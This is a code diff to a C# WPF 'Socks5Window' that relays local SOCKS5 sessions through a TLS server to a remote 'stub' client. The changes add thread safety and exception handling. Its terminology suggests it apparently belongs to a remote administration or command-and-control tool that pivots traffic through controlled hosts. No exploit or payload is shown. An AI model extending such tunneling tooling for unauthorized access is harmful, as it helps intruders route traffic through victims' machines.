@@ -15,7 +15,7 @@ public partial class Socks5Window : ThemedWindow
 {
     private readonly TlsServer _server;
     private readonly string    _clientId;
-    private bool _running;
+    private volatile bool _running;
     private TcpListener? _listener;
     private int _connCount;
 
@@ -169,13 +169,11 @@ public partial class Socks5Window : ThemedWindow
                 _ => throw new Exception("Unknown ATYP")
             };
             // For domain, we already read 4 bytes; buf[4] will have length after next read
-            int totalAddrPort = (buf[3] == 3 ? 1 : 0) + addrBytes + 2; // +1 for domain len byte, +2 for port
             if (buf[3] == 3)
             {
                 await ReadExact(stream, buf, 4, 1); // domain length byte
                 addrBytes = buf[4];
                 await ReadExact(stream, buf, 5, addrBytes + 2); // domain + port
-                totalAddrPort = 1 + addrBytes + 2;
             }
             else
             {
@@ -195,8 +193,8 @@ public partial class Socks5Window : ThemedWindow
                 })
             });
 
-            _connCount++;
-            _ = Dispatcher.BeginInvoke(() => TxtConnCount.Text = $"{_connCount} active");
+            int cnt = Interlocked.Increment(ref _connCount);
+            _ = Dispatcher.BeginInvoke(() => TxtConnCount.Text = $"{cnt} active");
             AddLog($"[>] Session {sessionId}  local:{((System.Net.IPEndPoint?)client.Client.RemoteEndPoint)?.Port}");
 
             // Now relay from local to stub
@@ -233,47 +231,63 @@ public partial class Socks5Window : ThemedWindow
 
     private void OnConnOk(Packet pkt)
     {
-        var d = JsonConvert.DeserializeObject<SocksConnResult>(pkt.Data);
-        if (d == null) return;
-        if (_pending.TryGetValue(d.SessionId, out var client))
+        try
         {
-            // Send SOCKS5 success reply
-            var reply = new byte[] { 5, 0, 0, 1, 0, 0, 0, 0, 0, 0 };
-            try { _ = client.GetStream().WriteAsync(reply); } catch { }
-            AddLog($"[✓] {d.SessionId} connected");
+            var d = JsonConvert.DeserializeObject<SocksConnResult>(pkt.Data);
+            if (d == null) return;
+            if (_pending.TryGetValue(d.SessionId, out var client))
+            {
+                // Send SOCKS5 success reply
+                var reply = new byte[] { 5, 0, 0, 1, 0, 0, 0, 0, 0, 0 };
+                try { _ = client.GetStream().WriteAsync(reply); } catch { }
+                AddLog($"[✓] {d.SessionId} connected");
+            }
         }
+        catch { }
     }
 
     private void OnConnErr(Packet pkt)
     {
-        var d = JsonConvert.DeserializeObject<SocksConnResult>(pkt.Data);
-        if (d == null) return;
-        if (_pending.TryRemove(d.SessionId, out var client))
+        try
         {
-            var reply = new byte[] { 5, 4, 0, 1, 0, 0, 0, 0, 0, 0 }; // Host unreachable
-            try { _ = client.GetStream().WriteAsync(reply); client.Close(); } catch { }
+            var d = JsonConvert.DeserializeObject<SocksConnResult>(pkt.Data);
+            if (d == null) return;
+            if (_pending.TryRemove(d.SessionId, out var client))
+            {
+                var reply = new byte[] { 5, 4, 0, 1, 0, 0, 0, 0, 0, 0 }; // Host unreachable
+                try { _ = client.GetStream().WriteAsync(reply); client.Close(); } catch { }
+            }
+            AddLog($"[✗] {d.SessionId}: {d.Error}");
         }
-        AddLog($"[✗] {d.SessionId}: {d.Error}");
+        catch { }
     }
 
     private void OnData(Packet pkt)
     {
-        var d = JsonConvert.DeserializeObject<SocksDataPacket>(pkt.Data);
-        if (d == null || string.IsNullOrEmpty(d.Data)) return;
-        if (_pending.TryGetValue(d.SessionId, out var client))
+        try
         {
-            var bytes = Convert.FromBase64String(d.Data);
-            try { _ = client.GetStream().WriteAsync(bytes); } catch { }
+            var d = JsonConvert.DeserializeObject<SocksDataPacket>(pkt.Data);
+            if (d == null || string.IsNullOrEmpty(d.Data)) return;
+            if (_pending.TryGetValue(d.SessionId, out var client))
+            {
+                var bytes = Convert.FromBase64String(d.Data);
+                try { _ = client.GetStream().WriteAsync(bytes); } catch { }
+            }
         }
+        catch { }
     }
 
     private void OnRemoteClose(Packet pkt)
     {
-        var d = JsonConvert.DeserializeObject<SocksCloseData>(pkt.Data);
-        if (d == null) return;
-        if (_pending.TryRemove(d.SessionId, out var client))
-            try { client.Close(); } catch { }
-        AddLog($"[-] {d.SessionId} closed by remote");
+        try
+        {
+            var d = JsonConvert.DeserializeObject<SocksCloseData>(pkt.Data);
+            if (d == null) return;
+            if (_pending.TryRemove(d.SessionId, out var client))
+                try { client.Close(); } catch { }
+            AddLog($"[-] {d.SessionId} closed by remote");
+        }
+        catch { }
     }
 
     // ── Helpers ──────────────────────────────────────────────────────────────
